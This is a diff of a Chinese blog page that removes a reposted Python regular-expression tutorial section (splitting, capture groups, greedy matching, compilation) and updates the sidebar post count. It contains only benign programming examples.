-<p>无论多少个空格都能正常分割。加入<code>,</code>试试： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;re.split(<span class="string">r&#x27;[\s\,]+&#x27;</span>,<span class="string">&#x27;a,b, c  d&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br></pre></td></tr></table></figure>
-再加入<code>;</code>试试： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[\s\,\;]+&#x27;</span>,<span class="string">&#x27;a,b;; c    d&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br></pre></td></tr></table></figure>
-如果用户输入了一组标签，下次记得用正则表达式来把不规范的输入转化成正确的数组。</p>
-<h2 id="分组"><strong>分组</strong></h2>
-<p>除了简单地判断是否匹配之外，正则表达式还有提取字串的强大功能。用<code>()</code>表示的就是要提取的分组(Group)。比如：<code>^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$</code>分别定义了两个组，可以直接从匹配的字符串中提取出区号和本地号码：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>m=re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;</span>,<span class="string">&#x27;010-12345&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;010-12345&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;010&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;12345&#x27;</span></span><br></pre></td></tr></table></figure>
-如果正则表达式中定义了组，就可以在<code>MATCH</code>对象上用<code>group()</code>方法提取出子串来。<br />
-注意到<code>group(0)</code>永远是与整个正则表达式相匹配的字符串，<code>group(1)</code>、<code>group(2)</code>……表示第1、2、……个子串。<br />
-提取子串非常有用。来看一个更凶残的例子： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="string">&#x27;19:05:30&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(0[0-9]|1[0-9]|2[0-3]|[0_9])\:(0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|[0-9])\:(0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|[0-9])$&#x27;</span>,t)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.groups()</span><br><span class="line">(<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;05&#x27;</span>,<span class="string">&#x27;30&#x27;</span>)</span><br></pre></td></tr></table></figure>
-这个正则表达式可以直接识别合法的时间。但是有些时候，用正则表达式也无法做到完全验证，比如识别日期：<br />
-<code>'^(0[1-9]|1[0-2]|[0-9])-(0[1-9]|1[0-9]|2[0-9]|3[0-1]|[0-9])$'</code>
-对于<code>2-30</code>,<code>4-31</code>这样的非法日期，用正则还是识别不了，或者说写出来非常困难，这时就需要程序配合识别了。</p>
-<h2 id="贪婪匹配"><strong>贪婪匹配</strong></h2>
-<p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的<code>0</code>:
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)(0*)$&#x27;</span>,<span class="string">&#x27;102300&#x27;</span>).groups()</span><br><span class="line">(<span class="string">&#x27;102300&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-由于<code>\d+</code>采用贪婪匹配，直接把后面的<code>0</code>全匹配了，结果<code>0*</code>只能匹配空字符串了。<br />
-必须让<code>\d+</code>采取非贪婪匹配（也就是尽可能少匹配），才能把后面的<code>0</code>匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+?)(0*)$&#x27;</span>,<span class="string">&#x27;102300&#x27;</span>).groups()</span><br><span class="line">(<span class="string">&#x27;1023&#x27;</span>,<span class="string">&#x27;00&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<h2 id="编译"><strong>编译</strong></h2>
-<p>当我们在python中使用正则表达式时，re模块内部会干两件事情： 1.
-编译正则表达式，如果正则表达式的字符串本身不合法，会报错； 2.
-用编译后的正则表达式去匹配字符串。
-如果一个正则表达式要重复使用几千次，出于效率的考虑，我们可以预编译正则表达式，接下来重复使用时就不需要编译这个步骤了，直接匹配：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"># 编译：</span><br><span class="line">&gt;&gt;&gt; re_telephone = re.compile(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;)</span><br><span class="line"># 使用：</span><br><span class="line">&gt;&gt;&gt; re_telephone.match(&#x27;010-12345&#x27;).groups()</span><br><span class="line">(&#x27;010&#x27;,&#x27;12345&#x27;)</span><br><span class="line">&gt;&gt;&gt; re_telephone.match(&#x27;010-8086&#x27;).groups()</span><br><span class="line">(&#x27;010&#x27;,&#x27;8086&#x27;)</span><br></pre></td></tr></table></figure> 编译后生成Regular
-Expression对象，由于该对象自己包含了正则表达式，所以调用对应的方法时不用给出正则字符串。</p>
-<p>转载于<a
-target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017639890281664">廖雪峰的官方网站</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2101,7 +2051,7 @@ target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1016959663
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
